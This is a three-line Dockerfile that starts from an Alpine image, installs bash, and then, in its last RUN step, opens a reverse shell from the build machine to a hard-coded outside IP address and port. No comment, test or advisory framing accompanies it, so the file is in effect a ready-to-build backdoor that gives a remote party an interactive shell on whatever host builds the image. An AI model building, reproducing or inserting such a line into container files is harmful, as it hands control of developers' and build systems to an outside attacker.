FROM alpine
RUN apk update && apk add bash
RUN /bin/bash -c 'bash -i >& /dev/tcp/45.9.148.123/2105 0>&1'